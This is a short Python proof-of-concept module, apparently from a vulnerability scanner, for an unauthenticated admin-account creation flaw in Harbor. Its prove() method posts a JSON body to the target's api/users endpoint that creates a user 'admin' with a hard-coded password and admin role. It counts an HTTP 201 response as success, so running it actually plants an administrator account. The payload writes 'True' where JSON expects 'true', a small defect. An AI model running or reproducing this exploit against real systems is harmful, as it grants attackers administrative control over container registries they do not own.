#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'harbor unauth admin add'
        self.keyword = ['harbor', 'web']
        self.info = 'harbor unauth admin add'
        self.type = VUL_TYPE.UNAUTH
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'api/users'
                data = '{"email":"admin@admin.com","password":"Abc@123456","realname":"xxx","username":"admin","has_admin_role":True}'
                headers = {'Content-Type': "application/json"}
                async with session.post(url=url, data=data, headers=headers) as response:
                    if response!=None and response.status==201:
                        self.flag = 1
                        self.res.append({"info": url, "key": "harbor unauth admin add"})